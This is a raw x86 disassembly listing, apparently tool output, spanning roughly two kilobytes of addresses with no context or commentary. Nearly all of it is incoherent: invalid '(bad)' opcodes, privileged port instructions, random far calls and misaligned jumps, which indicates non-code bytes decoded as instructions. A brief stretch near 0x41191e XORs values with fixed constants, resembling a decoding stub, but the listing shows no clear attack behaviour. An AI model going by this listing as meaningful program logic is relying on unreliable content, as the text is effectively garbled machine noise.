  411402:	pop    ecx
  411403:	ret    0x9266
  411406:	test   eax,0x4f073ec0
  41140b:	xchg   BYTE PTR [ebx-0x48],dl
  41140e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41140f:	jo     0x411490
  411411:	ja     0x4113c9
  411413:	xor    eax,DWORD PTR [edx+edx*8+0x21ef5b49]
  41141a:	mov    al,0x32
  41141c:	leave  
  41141d:	xor    al,0x54
  41141f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411420:	or     al,0x84
  411422:	cld    
  411423:	ror    BYTE PTR ds:[eiz*1-0x29bee7ff],0x6e
  41142c:	test   eax,0xf18657e2
  411431:	mov    edx,esi
  411433:	and    dl,bh
  411435:	fdivr  DWORD PTR [eax-0x2a]
  411438:	xor    al,0x13
  41143a:	xor    ch,0x3a
  41143d:	or     eax,DWORD PTR [ecx+0x39bcd668]
  411443:	dec    esi
  411444:	xchg   DWORD PTR [ebx],edi
  411446:	sahf   
  411447:	jmp    0x411478
  411449:	movntps XMMWORD PTR [ebx+eax*1-0x5228a33e],xmm7
  411451:	(bad)  
  411452:	addr16 aaa 
  411454:	jnp    0x4114a1
  411456:	xor    esi,DWORD PTR [edi+0x1a6e9f83]
  41145c:	dec    ecx
  41145d:	inc    ebp
  41145e:	sbb    al,0x68
  411460:	pop    esi
  411461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411462:	inc    edx
  411463:	into   
  411464:	push   esi
  411465:	(bad)  
  411467:	ds push ecx
  411469:	lea    eax,[esi+0x1853dd2]
  41146f:	sub    ecx,ebp
  411471:	mov    ecx,0xffaf1c33
  411476:	xor    al,0x52
  411478:	js     0x41146f
  41147a:	mov    ebx,edi
  41147c:	mov    edx,0xda145b84
  411481:	test   eax,0x5caff09f
  411486:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411487:	mov    bh,BYTE PTR ds:0xddeb79b
  41148d:	sahf   
  41148e:	and    esi,DWORD PTR [ebp+0x22]
  411491:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411492:	stos   DWORD PTR es:[edi],eax
  411493:	mov    DWORD PTR [ebx-0x185a9769],0xec56644e
  41149d:	(bad)  
  41149e:	inc    esp
  41149f:	xor    al,0x6c
  4114a1:	bound  esp,QWORD PTR [eax]
  4114a3:	outs   dx,DWORD PTR ds:[esi]
  4114a4:	(bad)  
  4114a5:	xor    BYTE PTR es:[esp+esi*2],0xa2
  4114aa:	adc    eax,DWORD PTR [edx+ebx*4-0x5a]
  4114ae:	cmp    DWORD PTR [ebx-0x54],ebx
  4114b1:	pop    eax
  4114b2:	adc    BYTE PTR [eax+0x5e],bh
  4114b5:	retf   
  4114b6:	cmp    esp,ebx
  4114b8:	popf   
  4114b9:	cs inc esp
  4114bb:	nop
  4114bc:	aaa    
  4114bd:	mov    eax,ds:0x6b327ddf
  4114c2:	idiv   dl
  4114c4:	mov    bl,0x2a
  4114c6:	sti    
  4114c7:	cmp    ch,al
  4114c9:	mov    dh,0xe3
  4114cb:	bound  edi,QWORD PTR [edi]
  4114cd:	lea    edx,[ecx-0x3ef9ff93]
  4114d3:	mov    esi,0xf357fc4c
  4114d8:	cmp    esi,eax
  4114da:	push   ebx
  4114db:	out    0x6c,eax
  4114dd:	sub    al,0xdf
  4114df:	sar    ah,0xd2
  4114e2:	cmp    al,0x3b
  4114e4:	imul   esi,DWORD PTR [eax+0x389f2f6a],0xffffff86
  4114eb:	popa   
  4114ec:	(bad)  
  4114ed:	frstor [ecx-0x39]
  4114f0:	cdq    
  4114f1:	sbb    BYTE PTR [eax-0x15ab9222],bl
  4114f7:	jns    0x411503
  4114f9:	push   edi
  4114fa:	xchg   esi,eax
  4114fb:	and    BYTE PTR [ebp+ecx*1-0x7c],0x17
  411500:	(bad)  
  411501:	ins    DWORD PTR es:[edi],dx
  411502:	jnp    0x411486
  411504:	call   DWORD PTR [esi-0x6d]
  411507:	outs   dx,BYTE PTR ds:[esi]
  411508:	mov    edx,0x3daa82da
  41150d:	sbb    al,0x17
  41150f:	fwait
  411510:	cmp    ebp,0xe5fb8450
  411516:	js     0x41155d
  411518:	jle    0x411554
  41151a:	and    BYTE PTR [ebp+ebx*8-0x5b],bl
  41151e:	stos   BYTE PTR es:[edi],al
  41151f:	test   al,0xf3
  411521:	aam    0x6b
  411523:	dec    ebx
  411524:	in     al,dx
  411525:	sub    DWORD PTR [edx-0x2de8359a],edx
  41152b:	fsubr  QWORD PTR [ecx-0x4ddfb8a]
  411531:	mov    ds,eax
  411533:	mov    ds,WORD PTR [edx+esi*8+0x26ba49ca]
  41153a:	cmp    ch,BYTE PTR [eax+0x7d]
  41153d:	dec    edi
  41153e:	clc    
  41153f:	push   esi
  411540:	and    esp,DWORD PTR [esi-0xe]
  411543:	mov    al,0x4e
  411545:	sub    eax,0x6c089a2
  41154a:	pop    DWORD PTR [edi+0x22aacce8]
  411550:	fcmovnbe st,st(3)
  411552:	fndisi(8087 only) 
  411554:	imul   BYTE PTR [eax]
  411556:	jnp    0x41153c
  411558:	pop    esi
  411559:	sbb    cl,BYTE PTR es:[edx]
  41155c:	out    dx,eax
  41155d:	out    dx,al
  41155e:	mov    bl,0x58
  411560:	retf   
  411561:	add    al,0x7
  411563:	jmp    0x4115a6
  411565:	imul   DWORD PTR [esi-0x6]
  411568:	or     eax,0x2c20d0a3
  41156d:	push   esi
  41156e:	jg     0x41151a
  411570:	cmp    BYTE PTR [eax+0x4195a66c],al
  411576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411577:	into   
  411578:	cmc    
  411579:	aas    
  41157a:	(bad)  
  41157b:	aad    0x1f
  41157d:	into   
  41157e:	pop    ds
  41157f:	retf   
  411580:	fst    QWORD PTR [ebx+0x6c]
  411583:	push   esp
  411584:	push   esp
  411585:	ds inc ebx
  411587:	push   edx
  411588:	inc    edi
  411589:	enter  0x7a48,0x62
  41158d:	mov    WORD PTR [edi],?
  41158f:	xor    dl,cl
  411591:	xchg   ecx,eax
  411592:	sbb    BYTE PTR [eax+edx*4+0x55],bl
  411596:	xor    DWORD PTR [eax-0x66303620],ebp
  41159c:	stos   BYTE PTR es:[edi],al
  41159d:	adc    ebx,DWORD PTR [ebx]
  41159f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4115a0:	cmp    eax,0xe560f35c
  4115a5:	daa    
  4115a6:	jg     0x411533
  4115a8:	test   al,0x58
  4115aa:	sbb    al,0x7f
  4115ac:	aam    0x5b
  4115ae:	xor    ch,BYTE PTR [ecx-0x69af3c28]
  4115b4:	push   ebx
  4115b5:	inc    esi
  4115b6:	add    dh,bh
  4115b8:	sub    eax,0x20e6034b
  4115bd:	adc    eax,0xa627a4fb
  4115c2:	fwait
  4115c3:	out    dx,eax
  4115c4:	sahf   
  4115c5:	int    0x3d
  4115c7:	rcl    BYTE PTR [ebx-0x4254828a],0x4f
  4115ce:	scas   al,BYTE PTR es:[edi]
  4115cf:	fstp   st(7)
  4115d1:	xor    al,0xad
  4115d3:	xor    dl,BYTE PTR [esi+0x473199b5]
  4115d9:	dec    edi
  4115da:	dec    esi
  4115db:	jns    0x411582
  4115dd:	cwde   
  4115de:	push   edx
  4115df:	mov    dh,BYTE PTR [ebp-0x6238b3c8]
  4115e5:	jbe    0x41162f
  4115e7:	mov    ds:0x122a95d4,eax
  4115ec:	inc    esi
  4115ed:	jg     0x4115ae
  4115ef:	(bad)  
  4115f0:	cmp    ebp,DWORD PTR [ebx]
  4115f2:	bound  ebx,QWORD PTR [esp+eiz*4-0xb]
  4115f6:	cmc    
  4115f7:	test   al,0xc8
  4115f9:	push   es
  4115fa:	fld    QWORD PTR [eax-0x2292fd9b]
  411600:	xchg   esp,eax
  411601:	js     0x4115f7
  411603:	nop
  411604:	js     0x4115ba
  411606:	retf   
  411607:	popa   
  411608:	not    BYTE PTR [eax-0x45362076]
  41160e:	push   cs
  41160f:	imul   esp,DWORD PTR [eax],0xffffffd3
  411612:	es adc eax,0x93103eff
  411618:	gs xor bh,bh
  41161b:	dec    DWORD PTR [ecx]
  41161d:	bound  ebx,QWORD PTR fs:[esp+esi*2-0x79]
  411622:	mov    cl,0xb0
  411624:	add    BYTE PTR [eax-0x46],bl
  411627:	push   0xffffffbd
  411629:	fs dec eax
  41162b:	shr    DWORD PTR [esi],cl
  41162d:	and    DWORD PTR [bx],ebx
  411630:	iret   
  411631:	xor    edi,edi
  411633:	push   ebp
  411634:	cmp    DWORD PTR ds:0x2c17a067,ecx
  41163a:	es sti 
  41163c:	test   DWORD PTR [ecx+eiz*8-0x3d7a9326],ebx
  411643:	or     BYTE PTR [eax-0x3b],0x27
  411647:	mov    ds:0x6fd4b64,al
  41164c:	mov    esp,0x70a59535
  411651:	out    dx,al
  411652:	xor    eax,0x1dee2373
  411657:	mov    al,ds:0x805d1b54
  41165c:	pushf  
  41165d:	cwde   
  41165e:	mov    al,0x4b
  411660:	and    DWORD PTR [edi+edi*1+0x4c],ebx
  411664:	push   0xfb6a1443
  411669:	push   edx
  41166a:	out    0x79,al
  41166c:	sti    
  41166d:	cmp    ch,al
  41166f:	mov    dl,0x2f
  411671:	xor    cl,bh
  411673:	retf   0x5066
  411676:	cmp    esi,DWORD PTR [esi+ebx*1-0x72dab13a]
  41167d:	xchg   ecx,eax
  41167e:	mov    ds:0xbeeacdd4,eax
  411683:	repz imul ecx,eax,0xd1b3c04b
  41168a:	sahf   
  41168b:	repnz xor BYTE PTR gs:[edx],ah
  41168f:	js     0x4116ad
  411691:	clc    
  411692:	outs   dx,DWORD PTR ds:[esi]
  411693:	pop    ecx
  411694:	pop    ss
  411695:	mov    ch,0xe8
  411697:	adc    ecx,esp
  411699:	xor    esi,DWORD PTR [esp+ecx*1-0x6fba5434]
  4116a0:	pmaddwd mm7,QWORD PTR [edx]
  4116a3:	cli    
  4116a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a5:	mov    al,ds:0x2c428860
  4116aa:	xlat   BYTE PTR ds:[ebx]
  4116ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116ac:	fild   QWORD PTR [edx+0x25]
  4116af:	mov    ecx,0x6e7179
  4116b4:	xor    al,BYTE PTR [ecx]
  4116b6:	jne    0x411726
  4116b8:	gs mov ah,0xba
  4116bb:	and    eax,0x66234add
  4116c0:	fsubr  DWORD PTR [edx]
  4116c3:	fs dec esp
  4116c5:	das    
  4116c6:	mov    dl,bl
  4116c8:	out    0x51,al
  4116ca:	les    ebx,FWORD PTR [ecx-0x7c]
  4116cd:	add    ah,BYTE PTR [ebx-0x7469758e]
  4116d3:	dec    ecx
  4116d4:	fmul   DWORD PTR [edi-0x7c]
  4116d7:	test   al,0xaf
  4116d9:	jb     0x4116c9
  4116db:	sbb    al,0xc5
  4116dd:	pusha  
  4116de:	xor    cl,BYTE PTR [edx]
  4116e0:	sub    eax,0x6513b470
  4116e5:	fisubr WORD PTR [ebp+0x17]
  4116e8:	cmp    ecx,edx
  4116ea:	aaa    
  4116eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ec:	adc    BYTE PTR fs:[ecx],ah
  4116ef:	inc    esi
  4116f0:	aam    0x1e
  4116f2:	aas    
  4116f3:	jl     0x41167e
  4116f5:	data16 out dx,al
  4116f7:	xor    dh,BYTE PTR [ebx+0x5797b2c3]
  4116fd:	into   
  4116fe:	lahf   
  4116ff:	mov    eax,ds:0xdb53adbf
  411704:	fcom   DWORD PTR [ebp+0x1d1a0836]
  41170a:	or     al,0x3c
  41170c:	sub    al,0x38
  41170e:	fidivr DWORD PTR [eax-0x298534f8]
  411714:	iret   
  411715:	add    ch,BYTE PTR [eax+0x63fc886f]
  41171b:	dec    ebp
  41171c:	stos   DWORD PTR es:[edi],eax
  41171d:	cmp    dh,BYTE PTR [ebx]
  41171f:	ret    0xd33d
  411722:	fwait
  411723:	mov    ch,0xdb
  411725:	ins    BYTE PTR es:[edi],dx
  411726:	(bad)  
  411727:	mov    dh,0xb
  411729:	xchg   ebx,eax
  41172a:	mov    ?,ebx
  41172c:	xchg   esp,eax
  41172d:	cmp    al,0x4c
  41172f:	clc    
  411730:	pop    ecx
  411731:	pop    edx
  411732:	in     eax,0xd
  411734:	inc    esp
  411735:	outs   dx,BYTE PTR ds:[esi]
  411736:	sub    al,0x7a
  411738:	mov    bh,ah
  41173a:	sbb    BYTE PTR es:[eax+0x22],bl
  41173e:	add    ecx,DWORD PTR [ebx-0x4a]
  411741:	pop    esi
  411742:	fnstenv [ebp+0x74]
  411745:	push   eax
  411746:	mov    ebp,0x16f90659
  41174b:	sbb    DWORD PTR [ecx-0x4e75b9e4],edi
  411751:	xchg   edi,eax
  411752:	adc    eax,ecx
  411754:	cmp    DWORD PTR [ebp+0x2f29fbb9],esp
  41175a:	push   cs
  41175b:	pop    edx
  41175c:	mov    ebp,0xcb977526
  411761:	scas   eax,DWORD PTR es:[edi]
  411762:	repnz rol bl,1
  411765:	sub    ebx,edi
  411767:	xor    al,0x62
  411769:	out    0x9e,eax
  41176b:	ret    
  41176c:	add    cl,dh
  41176e:	cmp    BYTE PTR [eax+esi*4],dh
  411771:	push   ds
  411772:	adc    BYTE PTR [esp+esi*8],cl
  411775:	popa   
  411776:	out    dx,eax
  411777:	stos   DWORD PTR es:[edi],eax
  411778:	sub    esi,DWORD PTR [esi]
  41177a:	(bad)  
  41177b:	fadd   st,st(4)
  41177d:	push   esp
  41177e:	mov    cs,WORD PTR [ebx+0x77804636]
  411784:	adc    bh,BYTE PTR [ebp+0x69]
  411787:	cmp    esi,DWORD PTR [edx]
  411789:	(bad)  
  41178a:	xor    ch,ah
  41178c:	mov    eax,0x24b0bf6
  411791:	inc    ecx
  411792:	mov    bl,0xca
  411794:	pop    ecx
  411795:	mov    edi,0xbb2d2c4f
  41179a:	dec    eax
  41179b:	inc    ecx
  41179c:	in     eax,dx
  41179d:	sub    al,0xce
  41179f:	dec    esi
  4117a0:	sub    eax,0x5c58ae4b
  4117a5:	call   0xd6b8:0x93d71e87
  4117ac:	mov    dh,0x8c
  4117ae:	jns    0x411779
  4117b0:	ins    DWORD PTR es:[edi],dx
  4117b1:	xchg   DWORD PTR [ebp+0x77],ebx
  4117b4:	add    al,BYTE PTR [si-0x2c94]
  4117b9:	jmp    0x80275658
  4117be:	or     BYTE PTR [esi-0x1ce1c5e0],0x39
  4117c5:	xor    eax,0x65c2c2ef
  4117ca:	sbb    al,0x86
  4117cc:	pop    ecx
  4117cd:	push   eax
  4117ce:	pop    ds
  4117cf:	pop    edx
  4117d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117d1:	test   al,0xb4
  4117d3:	inc    edi
  4117d4:	cmp    al,0xac
  4117d6:	(bad)  
  4117d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117d8:	push   eax
  4117d9:	push   edi
  4117da:	add    ebp,esp
  4117dc:	xor    ebp,ebx
  4117de:	mov    BYTE PTR [ebp+0x74],cl
  4117e1:	cdq    
  4117e2:	aam    0x3b
  4117e4:	push   ebx
  4117e5:	in     eax,0x11
  4117e7:	cmp    BYTE PTR [ebp-0x79],bl
  4117ea:	jmp    0x41177e
  4117ec:	arpl   WORD PTR [esi],si
  4117ee:	out    0x2b,eax
  4117f0:	aas    
  4117f1:	mov    BYTE PTR [esi],bh
  4117f3:	xchg   edx,eax
  4117f5:	pop    edx
  4117f6:	add    BYTE PTR [edi],dh
  4117f8:	mov    dl,0xd1
  4117fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117fb:	xlat   BYTE PTR ds:[ebx]
  4117fc:	add    esi,DWORD PTR [ecx+0x17ba6ae]
  411802:	inc    ebp
  411803:	adc    bh,BYTE PTR [ebp+0x15b685a1]
  411809:	cmc    
  41180a:	inc    esp
  41180b:	xchg   edx,eax
  41180c:	dec    ebx
  41180d:	inc    esp
  41180e:	jb     0x4117a9
  411810:	(bad)  
  411811:	sbb    eax,0x98daffb3
  411816:	dec    ebp
  411817:	xchg   esp,eax
  411818:	inc    ecx
  411819:	jge    0x4117cf
  41181b:	mov    esi,eax
  41181d:	add    BYTE PTR [ebx],dl
  41181f:	dec    eax
  411820:	pushf  
  411821:	xchg   edx,eax
  411822:	push   edx
  411823:	push   eax
  411824:	push   ds
  411825:	aas    
  411826:	sub    al,0xa2
  411828:	stos   DWORD PTR es:[edi],eax
  411829:	push   ds
  41182a:	jno    0x41184f
  41182c:	cmp    DWORD PTR [ecx+0x38],esi
  41182f:	ficomp DWORD PTR [ebx+0x5d878f56]
  411835:	jge    0x4117cf
  411837:	dec    ecx
  411838:	ret    
  411839:	and    eax,0x899e213e
  41183e:	pop    esi
  41183f:	mov    ch,0xdd
  411841:	inc    eax
  411842:	sbb    DWORD PTR [edi+0x56],0x54
  411846:	push   cs
  411847:	jge    0x411851
  411849:	jecxz  0x41181c
  41184b:	or     eax,0x70ea788c
  411850:	dec    esi
  411851:	or     ecx,DWORD PTR [ebx+0x7679caf9]
  411857:	inc    BYTE PTR [ecx+0x32]
  41185a:	xchg   esp,eax
  41185b:	adc    BYTE PTR [eax+0x35],al
  41185e:	in     al,0xe5
  411860:	shl    eax,1
  411862:	push   ss
  411863:	jae    0x4118e4
  411865:	pop    es
  411866:	add    DWORD PTR [esi+ecx*2+0x4b852662],0x290331e7
  411871:	xor    eax,0x76deedc3
  411876:	or     DWORD PTR [eax+0x450af0cc],ebx
  41187c:	or     BYTE PTR [ecx],al
  41187e:	cmp    eax,0xffffff9c
  411881:	or     ecx,ecx
  411883:	std    
  411884:	jb     0x411859
  411886:	test   BYTE PTR ds:[edx],cl
  411889:	pop    ds
  41188a:	push   0xa6c08ed3
  41188f:	call   0xe6825318
  411894:	enter  0x497c,0xbf
  411898:	test   eax,0x5f64181f
  41189d:	aas    
  41189e:	push   cs
  41189f:	shr    DWORD PTR [esi-0x65ee0ade],1
  4118a5:	mov    al,ds:0xb4c16a8a
  4118aa:	cmp    edx,DWORD PTR [eax-0x27556679]
  4118b0:	cmp    al,0xb
  4118b2:	mov    ds:0xef588195,al
  4118b7:	lods   eax,DWORD PTR ds:[esi]
  4118b8:	adc    eax,0x47ebb29f
  4118bd:	add    ecx,DWORD PTR [ebp-0x4]
  4118c0:	sub    DWORD PTR ds:0x7f88dad7,ecx
  4118c6:	jp     0x41184c
  4118c8:	add    cl,BYTE PTR [ecx]
  4118ca:	(bad)  
  4118cb:	shr    DWORD PTR [esi],1
  4118cd:	mov    edi,0x302b87e8
  4118d2:	sub    eax,0x2cb65771
  4118d7:	and    DWORD PTR [ebp+0x3289e830],ebp
  4118dd:	mov    ds:0xb6a4b38a,eax
  4118e2:	mov    BYTE PTR [eax],0x9f
  4118e5:	push   0xc8ec598a
  4118ea:	sar    BYTE PTR [ebp-0x2b],1
  4118ed:	pop    edx
  4118ee:	popa   
  4118ef:	mov    ebp,0x128429e1
  4118f5:	cs add ax,0x8148
  4118fa:	xor    al,0xeb
  4118fc:	jns    0x41190f
  4118fe:	(bad)  
  4118ff:	lea    esi,[esi+0x7c3d9a15]
  411905:	(bad)  
  411906:	push   ebx
  411907:	inc    esp
  411908:	(bad)  
  41190a:	sti    
  41190b:	push   ss
  41190c:	lock sbb BYTE PTR [edi+0x6911d613],0x89
  411914:	fsub   QWORD PTR [ebx]
  411916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411917:	test   dh,al
  411919:	popf   
  41191a:	out    dx,eax
  41191b:	mov    dh,0xaf
  41191d:	iret   
  41191e:	mov    edx,DWORD PTR [ebx]
  411920:	mov    edi,DWORD PTR [ebx+0x4]
  411923:	push   eax
  411924:	push   edi
  411925:	push   edx
  411926:	call   0x41e026
  41192b:	shld   edx,eax,0x2
  41192f:	mov    ecx,edx
  411931:	xor    edx,edx
  411933:	or     ecx,edx
  411935:	mov    edx,DWORD PTR [esi]
  411937:	mov    edi,DWORD PTR [esi+0x4]
  41193a:	shl    eax,0x2
  41193d:	or     eax,DWORD PTR [ebp+0x10]
  411940:	xor    edi,ecx
  411942:	xor    edx,eax
  411944:	xor    edx,0xba699573
  41194a:	xor    edi,0x9c0a89d8
  411950:	mov    DWORD PTR [esi],edx
  411952:	mov    DWORD PTR [esi+0x4],edi
  411955:	jmp    0x418549
  41195a:	mov    eax,DWORD PTR [ebp-0x24]
  41195d:	add    eax,DWORD PTR [ebp-0x4]
  411960:	mov    DWORD PTR [ebp-0x28],eax
  411963:	mov    eax,DWORD PTR [ebp-0x28]
  411966:	mov    eax,DWORD PTR [ebp-0x4]
  411969:	mov    eax,DWORD PTR [ebp-0x28]
  41196c:	mov    eax,DWORD PTR [eax+0xc]
  41196f:	mov    edx,DWORD PTR [ebp-0x4]
  411972:	movzx  eax,WORD PTR [edx+eax*1]
  411976:	cdq    
  411977:	shld   edx,eax,0x2
  41197b:	xor    edx,ecx
  41197d:	mov    DWORD PTR [ebp+0xc],edx
  411980:	mov    edx,DWORD PTR [ebp-0x58]
  411983:	jmp    0x411f0d
  411988:	jle    0x411958
  41198a:	addr16 ss daa 
  41198d:	push   ds
  41198e:	ds sahf 
  411990:	dec    ebx
  411991:	clc    
  411992:	pushf  
  411993:	outs   dx,BYTE PTR ds:[esi]
  411994:	retf   0x38b8
  411997:	push   0x161632fe
  41199c:	cmp    eax,0xe3161604
  4119a1:	xlat   BYTE PTR ds:[ebx]
  4119a2:	addr16 push ds
  4119a4:	pop    ds
  4119a5:	in     eax,0xf1
  4119a7:	shl    BYTE PTR [esi-0x314d7c50],0xd1
  4119ae:	test   DWORD PTR [eax-0x2a],0x9385561
  4119b5:	shl    DWORD PTR [edx+0xd641409],cl
  4119bb:	cli    
  4119bc:	cmp    BYTE PTR [esi+0x6419a893],0xc9
  4119c3:	repnz inc edx
  4119c5:	std    
  4119c6:	push   ebp
  4119c7:	adc    eax,0xf0b205b7
  4119cc:	sub    BYTE PTR [ecx],ah
  4119ce:	retf   
  4119cf:	sahf   
  4119d0:	out    dx,eax
  4119d1:	adc    BYTE PTR [esp+edx*8-0x733257db],bl
  4119d8:	bound  edi,QWORD PTR [ebx+0x4c]
  4119db:	and    al,0x85
  4119dd:	sub    BYTE PTR [ebp-0x11],ah
  4119e0:	daa    
  4119e1:	mov    ds:0x42d1254c,al
  4119e6:	imul   edi,DWORD PTR [ebp-0x503a7b22],0xffffffde
  4119ed:	neg    BYTE PTR [eax]
  4119ef:	retf   0x4339
  4119f2:	xlat   BYTE PTR ds:[ebx]
  4119f3:	sbb    DWORD PTR [ecx+0x0],ecx
  4119f6:	stos   BYTE PTR es:[edi],al
  4119f7:	pop    esp
  4119f8:	arpl   WORD PTR [ebx-0x13c25487],si
  4119fe:	push   0xddcc77a4
  411a03:	jecxz  0x411a6b
  411a05:	push   cs
  411a06:	cs aam 0xc9
  411a09:	aas    
  411a0a:	out    0x43,al
  411a0c:	lock sbb esi,DWORD PTR es:[ecx]
  411a10:	sub    DWORD PTR [ebp-0x437ec577],esi
  411a16:	cmp    eax,0x74914f52
  411a1b:	ins    BYTE PTR es:[edi],dx
  411a1c:	xchg   ebx,eax
  411a1d:	and    bh,ch
  411a1f:	xor    ecx,DWORD PTR ds:0x7f2dcccf
  411a25:	aad    0x93
  411a27:	in     ax,dx
  411a29:	mov    ecx,0x8794d95a
  411a2e:	(bad)  
  411a2f:	out    0xd8,al
  411a31:	or     al,0xc5
  411a33:	xchg   DWORD PTR [edi+0x52ea7192],esp
  411a39:	sub    DWORD PTR [ebx],ebp
  411a3b:	sub    dl,BYTE PTR [esp+esi*8-0x51]
  411a3f:	mov    cl,0xc6
  411a41:	gs cwde 
  411a43:	lea    ecx,[eax+0x5a5bfce9]
  411a49:	jbe    0x411a5e
  411a4b:	sub    bl,BYTE PTR [ecx-0x7dd0ca75]
  411a51:	inc    ebp
  411a52:	pop    esi
  411a53:	(bad)  
  411a54:	push   esp
  411a55:	ds clc 
  411a57:	mov    dl,0x63
  411a59:	not    DWORD PTR [eax+0x539a5eb6]
  411a5f:	sub    BYTE PTR [esi+0x53],bl
  411a62:	xchg   ebp,eax
  411a63:	es iret 
  411a65:	jb     0x411a85
  411a67:	stos   BYTE PTR es:[edi],al
  411a68:	sbb    BYTE PTR [ebx+0xf],ah
  411a6b:	(bad)  
  411a6c:	mov    es,esi
  411a6e:	out    0x5,eax
  411a70:	out    0xc0,al
  411a72:	inc    ebx
  411a73:	dec    edi
  411a74:	ja     0x411a3c
  411a76:	sbb    eax,0x7d004d99
  411a7b:	fcomp  st(2)
  411a7d:	jne    0x411aed
  411a7f:	sub    DWORD PTR [edx+0xf],0xffffff9f
  411a83:	lahf   
  411a84:	stos   BYTE PTR es:[edi],al
  411a85:	mov    dh,0x55
  411a87:	sbb    al,0xee
  411a89:	call   0x8e32:0x4c3764ae
  411a90:	cli    
  411a91:	or     ebx,edx
  411a93:	pop    ss
  411a94:	dec    ecx
  411a95:	stos   BYTE PTR es:[edi],al
  411a96:	int3   
  411a97:	ja     0x411ab6
  411a99:	jae    0x411a3a
  411a9b:	cld    
  411a9c:	inc    ecx
  411a9d:	inc    ebx
  411a9e:	mov    cl,BYTE PTR [ecx]
  411aa0:	mov    ecx,0x8bafceff
  411aa5:	rcl    ebx,0x9b
  411aa8:	xor    eax,0xd0e705a5
  411aad:	and    al,0x7e
  411aaf:	pop    ebx
  411ab0:	mov    dh,BYTE PTR [ebx]
  411ab2:	pop    edx
  411ab3:	fmul   DWORD PTR [edx+0x5e445a39]
  411ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411aba:	pop    esp
  411abb:	call   0xeec:0x55e338eb
  411ac2:	popa   
  411ac3:	call   0x8cf5:0x90f7d91e
  411aca:	push   ds
  411acb:	int    0x5a
  411acd:	xor    BYTE PTR [ebx+0x67415a25],bl
  411ad3:	jg     0x411a7f
  411ad5:	das    
  411ad6:	push   edi
  411ad7:	mov    edx,0xcfacfc5c
  411adc:	mov    edi,0xe15efae5
  411ae1:	shr    DWORD PTR [edi+0x74e031a1],0x52
  411ae8:	arpl   WORD PTR [edx],bx
  411aea:	jp     0x411b55
  411aec:	add    ecx,DWORD PTR [edi]
  411aee:	cdq    
  411aef:	cld    
  411af0:	mov    ecx,0xb7ff576f
  411af5:	mov    eax,ds:0x57621d54
  411afa:	push   ss
  411afb:	sub    eax,0x3a1ddb4
  411b00:	push   ds
  411b01:	or     esi,ebx
  411b03:	fs push 0x6fb6da3
  411b09:	clc    
  411b0a:	pop    ebx
  411b0b:	mov    eax,0xf20d961b
  411b10:	bound  ecx,QWORD PTR [ebx]
  411b12:	mov    ch,BYTE PTR [ebp+0x36c55f37]
  411b18:	or     BYTE PTR [ecx-0x198ddbff],bl
  411b1e:	xchg   ecx,eax
  411b1f:	ror    BYTE PTR [eax+0x6484d459],cl
  411b25:	inc    ebp
  411b26:	call   0xbe90e791
  411b2b:	mov    ah,0xda
  411b2d:	xchg   ebx,eax
  411b2e:	push   edx
  411b2f:	push   esi
  411b30:	add    ebp,edi
  411b32:	sub    edi,DWORD PTR [eax+ebx*4+0x2e]
  411b36:	push   ds
  411b37:	adc    DWORD PTR [edi-0x21bda98d],ebp
  411b3d:	mov    es,WORD PTR ds:0xe637d34d
  411b43:	in     al,0x6
  411b45:	xchg   ecx,eax
  411b46:	sti    
  411b47:	or     eax,0xdf4a7a98
  411b4c:	inc    esp
  411b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b4e:	rcr    dl,1
  411b50:	pop    ebp
  411b51:	call   0x28f9:0xf005908e
  411b58:	popa   
  411b59:	aam    0xbc
  411b5b:	outs   dx,BYTE PTR ds:[esi]
  411b5c:	setle  BYTE PTR [esi-0x1c]
  411b60:	pop    esi
  411b61:	es jae 0x411bab
  411b64:	adc    DWORD PTR [edx-0x113ba510],edi
  411b6a:	fsubr  DWORD PTR [ecx-0xf567c16]
  411b70:	sub    BYTE PTR [ebx-0x40ab5d2d],ch
  411b76:	push   ebx
  411b77:	mov    ah,BYTE PTR [edx+0x3036634f]
  411b7d:	jo     0x411bb9
  411b7f:	sub    edi,esp
  411b81:	rcl    DWORD PTR [edx+0x3cc9958b],1
  411b87:	pop    eax
  411b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b89:	int3   
  411b8a:	cdq    
  411b8b:	test   DWORD PTR [ecx+0x1f3bb5ba],ecx
  411b91:	xchg   edx,eax
  411b92:	(bad)  
  411b93:	xchg   edx,eax
  411b94:	mov    al,ds:0xe6e4779f
  411b99:	retf   
  411b9a:	mov    eax,ds:0xc773602c
  411b9f:	xor    edi,DWORD PTR [ecx+0x12a2339c]
  411ba5:	xchg   esi,eax
  411ba6:	data16 ja 0x411b61
  411ba9:	mov    bl,0x51
  411bab:	mov    ds:0x7b3e20e2,al
  411bb0:	sbb    ch,BYTE PTR [ecx-0x7b]
  411bb3:	push   0xffffffd8
  411bb5:	enter  0x7f6,0x8
  411bb9:	test   al,0x8
  411bbb:	push   ds
  411bbc:	inc    esp
  411bbd:	pop    ebp
  411bbe:	jle    0x411bb5
  411bc0:	push   eax
  411bc1:	icebp  
  411bc2:	jno    0x411b98
  411bc4:	mov    esp,0xd0c397a7
  411bc9:	sahf   
  411bca:	dec    ebx
  411bcb:	inc    ebx
  411bcc:	cwde   
  411bcd:	shl    BYTE PTR [ebp+0x21508dcf],0x4d
  411bd4:	pop    ecx
  411bd5:	push   ss
  411bd6:	inc    edi
  411bd7:	pop    es
  411bd8:	addr16 mov eax,ds:0x995b
  411bdc:	inc    esi
  411bdd:	fimul  DWORD PTR [edx+0x45]
  411be0:	imul   ecx,DWORD PTR [ebx+0x22],0xffffffe2
